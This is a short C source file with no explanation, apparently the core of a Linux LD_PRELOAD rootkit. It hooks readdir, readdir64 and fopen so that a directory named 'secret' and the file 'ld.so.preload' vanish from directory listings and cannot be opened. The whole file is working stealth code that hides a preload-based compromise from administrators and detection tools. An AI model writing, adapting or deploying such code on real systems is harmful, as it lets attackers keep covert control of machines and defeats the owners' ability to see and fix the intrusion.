#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>

#define HIDDEN_DIR "secret"
#define HIDDEN_FILE "ld.so.preload"

struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}

struct dirent64 *(*orig_readdir64)(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp)
{
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen)
        orig_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, HIDDEN_FILE) != NULL) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}
